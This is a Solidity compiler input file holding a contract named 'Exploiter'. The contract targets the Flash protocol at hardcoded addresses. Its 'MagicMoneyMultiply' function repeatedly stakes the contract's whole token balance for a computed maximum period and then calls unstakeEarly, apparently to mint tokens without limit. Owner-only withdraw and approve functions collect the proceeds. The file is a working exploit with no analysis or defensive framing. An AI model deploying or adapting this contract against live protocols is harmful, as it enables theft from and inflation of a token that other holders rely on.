{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/exploit.sol":{"content":"pragma solidity 0.6.12;\n\ninterface IFlashToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    function mint(address to, uint256 value) external returns (bool);\n\n    function burn(uint256 value) external returns (bool);\n}\n\n// File: ../../../../media/shakeib98/xio-flash-protocol/contracts/interfaces/IFlashReceiver.sol\n\npragma solidity 0.6.12;\n\ninterface IFlashReceiver {\n    function receiveFlash(\n        bytes32 id,\n        uint256 amountIn,\n        uint256 expireAfter,\n        uint256 mintedAmount,\n        address staker,\n        bytes calldata data\n    ) external returns (uint256);\n}\n\n// File: ../../../../media/shakeib98/xio-flash-protocol/contracts/interfaces/IFlashProtocol.sol\n\npragma solidity 0.6.12;\n\ninterface IFlashProtocol {\n    enum LockedFunctions { SET_MATCH_RATIO, SET_MATCH_RECEIVER }\n\n    function TIMELOCK() external view returns (uint256);\n\n    function FLASH_TOKEN() external view returns (address);\n\n    function matchRatio() external view returns (uint256);\n\n    function matchReceiver() external view returns (address);\n\n    function stakes(bytes32 _id)\n        external\n        view\n        returns (\n            uint256 amountIn,\n            uint256 expiry,\n            uint256 expireAfter,\n            uint256 mintedAmount,\n            address staker,\n            address receiver\n        );\n\n    function stake(\n        uint256 _amountIn,\n        uint256 _days,\n        address _receiver,\n        bytes calldata _data\n    )\n        external\n        returns (\n            uint256 mintedAmount,\n            uint256 matchedAmount,\n            bytes32 id\n        );\n\n    function lockFunction(LockedFunctions _lockedFunction) external;\n\n    function unlockFunction(LockedFunctions _lockedFunction) external;\n\n    function timelock(LockedFunctions _lockedFunction) external view returns (uint256);\n\n    function balances(address _staker) external view returns (uint256);\n\n    function unstake(bytes32 _id) external returns (uint256 withdrawAmount);\n\n    function unstakeEarly(bytes32 _id) external returns (uint256 withdrawAmount);\n\n    function getFPY(uint256 _amountIn) external view returns (uint256);\n\n    function setMatchReceiver(address _newMatchReceiver) external;\n\n    function setMatchRatio(uint256 _newMatchRatio) external;\n\n    function getMatchedAmount(uint256 mintedAmount) external view returns (uint256);\n\n    function getMintAmount(uint256 _amountIn, uint256 _expiry) external view returns (uint256);\n\n    function getPercentageStaked(uint256 _amountIn) external view returns (uint256 percentage);\n\n    function getInvFPY(uint256 _amount) external view returns (uint256);\n\n    function getPercentageUnStaked(uint256 _amount) external view returns (uint256 percentage);\n}\n\n// File: ../../../../media/shakeib98/xio-flash-protocol/contracts/libraries/SafeMath.sol\n\npragma solidity 0.6.12;\n\n// A library for performing overflow-safe math, courtesy of DappHub: https://github.com/dapphub/ds-math/blob/d0ef6d6a5f/src/math.sol\n// Modified to include only the essentials\nlibrary SafeMath {\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x + y) >= x, \"MATH:: ADD_OVERFLOW\");\n    }\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x - y) <= x, \"MATH:: SUB_UNDERFLOW\");\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"MATH:: MUL_OVERFLOW\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \"MATH:: DIVISION_BY_ZERO\");\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n}\n\n// File: ../../../../media/shakeib98/xio-flash-protocol/contracts/libraries/Address.sol\n\npragma solidity 0.6.12;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n\n        uint256 size;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n}\n\n// File: ../../../../media/shakeib98/xio-flash-protocol/contracts/FlashProtocol.sol\n\npragma solidity 0.6.12;\n\n\n\n\n\n\ncontract Exploiter {\n    using SafeMath for uint256;\n    using Address for address;\n\n \n\n    address public constant  FLASH_TOKEN = 0xB4467E8D621105312a914F1D42f10770C0Ffe3c8;\n    address public constant  FLASH_PROTOCOL = 0xEc02f813404656E2A2AEd5BaeEd41D785324E8D0;\n\n    uint256 internal constant MAX_FPY_FOR_1_YEAR = 5e17;\n    uint256 internal constant SECONDS_IN_1_YEAR = 365 * 86400;\n\n    address public  master;\n\n\n    modifier onlyMaster {\n        require(msg.sender == master, \"FlashProtocol:: NOT_MASTER\");\n        _;\n    }\n\n   \n\n    constructor() public {\n        _setMaster(msg.sender);\n    }\n\n    function _setMaster(address _newMaster) internal {\n        master = _newMaster;\n    }\n   \n    function Withdraw (uint256 Amount, address token) external onlyMaster\n    {\n       IFlashToken(token).transfer(address(msg.sender), Amount);\n    }\n   \n    function getApproval () external onlyMaster\n    {\n        IFlashToken(FLASH_TOKEN).approve(FLASH_PROTOCOL,uint256(-1));\n    }\n   \n   \n\n    function MagicMoneyMultiply (uint256 iterations, bytes calldata _data) external onlyMaster\n    {\n        for(uint i = 0; i < iterations; i++)\n        {\n            uint256 amountIn = IFlashToken(FLASH_TOKEN).balanceOf(address(this));\n            (,,bytes32 id) = IFlashProtocol(FLASH_PROTOCOL).stake( amountIn, calculateMaxStakePeriod(amountIn), address(this), _data);\n            IFlashProtocol(FLASH_PROTOCOL).unstakeEarly(id);\n        }\n    }\n\n    function calculateMaxStakePeriod(uint256 _amountIn) public view returns (uint256) {\n        return MAX_FPY_FOR_1_YEAR.mul(SECONDS_IN_1_YEAR).div(IFlashProtocol(FLASH_PROTOCOL).getFPY(_amountIn));\n    }\n   \n    function receiveFlash(\n        bytes32 id,\n        uint256 amountIn,\n        uint256 expireAfter,\n        uint256 mintedAmount,\n        address staker,\n        bytes calldata data\n    ) external returns (uint256)\n    {}\n   \n}"}}}